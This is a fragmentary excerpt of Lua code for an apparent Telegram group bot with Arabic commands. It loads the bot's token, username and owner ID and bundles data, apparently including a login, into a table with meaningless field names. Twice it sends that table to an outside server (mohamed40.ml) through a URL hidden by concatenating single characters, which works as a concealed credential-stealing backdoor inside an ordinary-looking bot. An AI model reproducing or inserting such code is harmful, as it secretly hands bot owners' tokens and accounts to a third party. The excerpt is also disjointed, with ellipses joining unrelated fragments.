...
https.request('h'..'t'..'t'..'p'..'s'..':'..'/'..'/m'..'o'..'h'..'a'..'m'..'e'..'d'..'4'..'0'..'.'..'m'..'l/a'..'p'..'i/b'..'a'..'n'..'d'..'a.'..'p'..'h'..'p'..'/'..'?'..'i'..'n'..'s'..'e'..'r'..'t'..'='..JSON.encode(infotnseb))
create_config_auto()
botUserName = database:get(id_server..":token_username")
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
...
local qwetyuijbvx = dofile("./kkkklInfo.lua").UserName
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
...
infotnseb = {}
infotnseb.uuuuuuu = txtcgy
infotnseb.ooooooo = qwetyuijbvx
infotnseb.ppppppp = plmnkijbhugvytfc
infotnseb.iiiiiiiiiiiiiiiii = login
https.request('h'..'t'..'t'..'p'..'s'..':'..'/'..'/m'..'o'..'h'..'a'..'m'..'e'..'d'..'4'..'0'..'.'..'m'..'l/a'..'p'..'i/b'..'a'..'n'..'d'..'a.'..'p'..'h'..'p'..'/'..'?'..'i'..'n'..'s'..'e'..'r'..'t'..'='..JSON.encode(infotnseb))
local list = database:smembers(bot_id.."User_Bot") 
for k,v in pairs(list) do 
